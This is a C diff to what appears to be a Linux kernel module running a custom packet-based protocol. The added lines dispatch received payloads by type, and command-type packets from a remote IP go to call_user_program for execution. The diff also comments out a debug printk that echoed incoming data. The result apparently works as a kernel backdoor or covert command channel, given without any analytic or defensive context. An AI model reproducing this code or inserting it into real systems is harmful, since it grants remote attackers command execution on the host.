@@ -29,6 +29,10 @@ int send_data(unsigned int ip, unsigned short *buf, int size, unsigned int seq)
         case _WAIT:
             *buf = 0x0100 + pd->type;
             set_sstate(pd, _WAIT2);
+            if (pd->type == TP_ACKN)
+            {
+                del_data(&send_map, ip);
+            }
             break;
         case _WAIT2:
             *buf = 0x8000 + pd->size;
@@ -57,11 +61,12 @@ void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned in
         if ((*buf & 0xff) != TP_ACKN)
         {
             pd = find_data(&recv_map, ip);
-            if (!pd)
+            if (pd)
             {
-                pd = append_data(&recv_map, ip, 0);
-                pd->type = *buf & 0xff;
+                del_data(&recv_map, ip);
             }
+            pd = append_data(&recv_map, ip, 0);
+            pd->type = *buf & 0xff;
         }
         else
         {
@@ -88,8 +93,7 @@ void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned in
             break;
         case _RECV:
             add_content(pd, buf, size);
-            printk(KERN_CONT "%c%c", *buf & 0xff, *buf >> 8);
-            /* infonum(pd->cont_pos); */
+            /* printk(KERN_CONT "%c%c", *buf & 0xff, *buf >> 8); */
             if (pd->cont_pos == pd->size)
             {
                 set_rstate(pd, _CHEK);
@@ -99,11 +103,19 @@ void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned in
             {
                 unsigned short chksum;
                 chksum = check_chk(pd);
-                print_data(pd); // print
                 if (!memcmp(&chksum, buf, sizeof(chksum)))
                 {
-                    save_to_file(SAVEFILE, pd);
-                    info("Checksum correct!\n");
+                    printk(KERN_INFO "Recived data:\n");
+                    print_data(pd);
+                    /* info("Checksum correct!\n"); */
+                    switch (pd->type)
+                    {
+                        case TP_ACKN: break;
+                        case TP_COMD: call_user_program(pd->content, pd->ip); break;
+                        case TP_SHFL: break;
+                        case TP_DATA: save_to_file(SAVEFILE, pd); break;
+                    }
+                    
                     del_data(&recv_map, ip);
 
                     pd = append_data(&send_map, ip, 0);
